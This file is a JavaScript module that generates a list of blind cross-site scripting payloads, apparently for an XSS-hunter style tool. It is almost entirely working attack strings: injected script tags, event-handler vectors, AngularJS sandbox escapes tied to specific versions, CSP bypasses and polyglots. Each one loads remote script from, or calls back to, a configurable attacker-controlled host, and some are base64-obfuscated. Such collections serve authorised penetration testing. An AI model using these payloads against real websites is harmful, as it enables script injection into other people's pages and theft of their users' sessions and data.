const jsdom = require('jsdom');

const { JSDOM } = jsdom;

exports.generatePayloads = config =>
  this.payloadList(config)
    .map(payload => `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`)
    .join('');

exports.payloadList = config => {
  const payloads = [
    {
      description: 'Image HTTP Interaction',
      payload: `"><img src='//${config.url}/mH'/>`
    },
    {
      description: 'External JavaScript',
      id: '1',
      payload: `"><script id='1' src="//${config.url}/m"></script>`
    },
    {
      description: 'JavaScript URI',
      id: '2',
      payload: `javascript:eval('d=document; _ = d.createElement(\\'script\\');_.id='2';_.src=\\'//${
        config.url
      }/m\\';d.body.appendChild(_)")`
    },
    {
      description: 'JavaScript URI href',
      id: '3',
      payload: `"><a href="javascript:eval('d=document; _ = d.createElement(\\'script\\');_.id=\\'3\\';_.src=\\'//localhost/m\\';d.body.appendChild(_)')">Click</a>`
    },
    {
      description: 'https://html5sec.org - Self-executing focus event via autofocus',
      id: '4',
      payload: `"><input onfocus="eval('d=document; _ = d.createElement(\\'script\\');_.id=\\'4\\';_.src=\\'\\/\\/localhost/m\\';d.body.appendChild(_)')" autofocus>`
    },
    {
      description: 'https://html5sec.org - HTML5 - JavaScript execution via <iframe> and onload',
      id: '5',
      payload: `<iframe onload="eval('d=document; _=d.createElement(\\'script\\');_.id=\\'5\\';_.src=\\'\\/\\/${
        config.url
      }/m\\';d.body.appendChild(_)')">`
    },
    {
      description:
        'https://html5sec.org - SVG - SVG tags allow code to be executed with onload without any other elements. This makes for a very short and effective XSS vector, useful in many situations.',
      id: '6',
      payload: `<svg onload="javascript:eval('d=document; _ = d.createElement(\\'script\\');_.id=\\'6\\';_.src=\\'//${
        config.url
      }\\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>`
    },
    {
      description:
        'https://html5sec.org - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known. ',
      id: '7',
      payload: `"><body onpageshow="eval('d=document; _ = d.createElement(\\'script\\');_.id=\\'7\\'_.src=\\'//${
        config.url
      }/m\\';d.body.appendChild(_)')">`
    },
    {
      description:
        'xsshunter.com - Matthew Bryant - For when <script> tags are explicitly filtered.',
      id: '8',
      payload: `"><img src=x id='${this.encodePayload(
        config,
        '8'
      )}'; onerror=eval(atob(this.id))></script>`
    },
    {
      description: 'Mario Heiderch - Angular/JS Payload',
      id: '9',
      payload: `{{constructor.constructor("d=document; _ = d.createElement('script');_.id='9';_.src='//${
        config.url
      }/m';d.body.appendChild(_)")()}} `
    },
    {
      description: 'Lewis Ardern/Gareth Heyes - AngularJS Payload',
      id: '10',
      payload: `{{$on.constructor("d=document; _ = d.createElement('script');_.id='10';_.src='//${
        config.url
      }/m';d.body.appendChild(_)")()}}`
    },
    {
      description: 'Gareth Heyes - 1.2.0 - 1.2.5 - AngularJS Payload',
      id: '11',
      payload: `{{ a="a"["constructor"].prototype;a.charAt=a.trim; $eval('a",eval(\`d=document;_=d\\\\x2ecreateElement(\\'script\\'); _\\\\x2eid=\\'11\\'; _\\\\x2esrc=\\'//localhost/m\\'; d\\\\x2ebody\\\\x2eappendChild(_);\`),"') }}`
    },
    {
      description: 'Jan Horn - 1.2.6 - 1.2.18 - AngularJS Payload',
      id: '12',
      payload: `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("d=document; _ = d.createElement(\\'script\\');_.id=\\'12\\';_.src=\\'//${
        config.url
      }/m\\';d.body.appendChild(_)")')()}}`
    },
    {
      description: 'Mathias Karlsson - 1.2.19 (FireFox) AngularJS Payload',
      id: '13',
      payload: `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a",'eval("d=document; _ = d.createElement(\\'script\\');_.id=\\'13\\';_.src=\\'//${
        config.url
      }/m\\';d.body.appendChild(_)")'].sort(toString.constEructor);}}`
    },
    {
      description: 'Gareth Heyes - 1.2.20 - 1.2.29 - AngularJS Payload',
      id: '14',
      payload: `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",eval(\`d=document; _=d\\\\x2ecreateElement(\\'script\\');_\\\\x2eid=\\'14\\';_\\\\x2esrc=\\'//${
        config.url
      }/m\\';d\\\\x2ebody\\\\x2eappendChild(_);\`),"')}}`
    },
    {
      description: 'Gareth Heyes - 1.3.0 - 1.3.9 - AngularJS Payload',
      id: '15',
      payload: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,eval(\`d=document; _=d\\\\x2ecreateElement(\\'script\\');_\\\\x2eid=\\'15\\';_\\\\x2esrc=\\'//${
        config.url
      }/m\\';d\\\\x2ebody\\\\x2eappendChild(_);\`),a')}}`
    },
    {
      description: 'Gareth Heyes - 1.4.0 - 1.5.8 - AngularJS Payload',
      id: '16',
      payload: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,eval(\`d=document; _=d.createElement(\\'script\\');_.id=\\'16\\';_.src=\\'//${
        config.url
      }/m\\';d.body.appendChild(_);\`),a')}}`
    },
    {
      description: 'Jan Horn - 1.5.9 - 1.5.11 - AngularJS Payload',
      id: '17',
      payload: `{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(\`d=document; _=d.createElement(\\\\'script\\\\');_.id=\\\\'17\\\\';_.src=\\\\'//${
        config.url
      }/m\\\\';d.body.appendChild(_);\`)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}`
    },
    {
      description: 'Gareth Heyes/Sirdarckcat - AngularJS CSP Bypass - Nonce - HTTP Interaction',
      id: '18',
      payload: `<textarea autofocus ng-focus="d=$event.view.document;d.location='//${
        config.url
      }/mH'"></textarea>`
    },
    {
      description: 'CSP Bypass - URL scheme/wildcard in script-src ',
      id: '19',
      payload: `"><script src=data:text/javascript;base64,${this.encodePayloadHttpInteraction(
        config
      )}></script>`
    },
    {
      description: 'CSP Bypass - Missing or relaxed object-src with script-src nonce',
      id: '20',
      payload: `"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\"})))}catch(e){d=document; _ = d.createElement(\`script\`);_.nonce=d.querySelector(\`script\`).nonce||\`\`;_.id=\`20\`;_.src=\`//${
        config.url
      }/m\`;d.body.appendChild(_)}//' allowscriptaccess=always>`
    },
    {
      description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload',
      id: '21',
      payload: `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*&lt;svg/*/onload=eval("d=document; _ = d.createElement('script');_.id='20';_.src='//${
        config.url
      }/m';d.body.appendChild(_)")//>`
    },
    {
      description: 'GoogleScriptGadget - Aurelia - CSP Bypass',
      id: '21',
      payload: `"TODO`
    },
    {
      description: 'GoogleScriptGadget - Polymer - CSP Bypass',
      id: '22',
      payload: `"TODO`
    },
    {
      description: 'GoogleScriptGadget - Vue.js - CSP Bypass',
      id: '23',
      payload: `<div v-html="''.constructor.constructor('d=document;s=d.createElement(\\'script\\');s.nonce=d.querySelector(\\'script[nonce]\\').nonce;s.src=\\'//${
        config.url
      }/m\\';d.x||d.body.appendChild(s);d.x=1')()"> aaa</div>`
    },
    {
      description: 'CSP Bypass For Missing or Relaxed Object-Src',
      id: '24',
      payload: `TODO`
    },
    {
      description: 'PortSwigger - BurpSuite Polygot Payload',
      payload: `</script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/${
        config.url
      }.slice(2),document.documentElement.appendChild(s))//'>`
    },
    {
      description: 'PortSwigger - BurpSuite HTTP Interaction Polygot Payload',
      payload: `/*</script><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+((new(Image)).src=((new(Image)).src=([]+//${
        config.url
      }/mH/).replace(/\\/g,[]))//'>`
    },
    {
      description:
        'CSP Bypass - Bypassing script nonces via base tags and data URIs (All resources are belong to us) ',
      payload: `"><base href="${config.url}">`
    },
    {
      description: 'xsshunter.com - Matthew Bryant - jQuery Payload',
      payload: `"><script>$.getScript("//${config.url}/m")</script>`
    },
    {
      description:
        'xsshunter.com - Matthew Bryant - XHR - To bypass unsafe-inline/unsafe-eval CSP policies',
      payload: `"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//${
        config.url
      }/m");a.send();</script>`
    }
  ];
  return payloads;
};

exports.encodePayload = (config, id) => {
  console.log(id);
  const btoa = require('btoa');
  return btoa(
    `d=document; _ = d.createElement('script');_.id='${id}';_.src='//${
      config.url
    }/m';d.body.appendChild(_) `
  );
};

exports.encodePayloadHttpInteraction = config => {
  const btoa = require('btoa');
  return btoa(`document.location='//${config.url}/mH'`);
};

exports.processPayload = (html, config) => {
  if (html) {
    let pload = html;
    const p = this.payloadList(config);
    const dom = new JSDOM(pload);
    if (dom.window.document.querySelector('script')) {
      p.forEach(payload => {
        if (payload.id === dom.window.document.querySelector('script').id) {
          pload = payload.payload;
        }
      });
    }
    return pload;
  }
  return null;
};
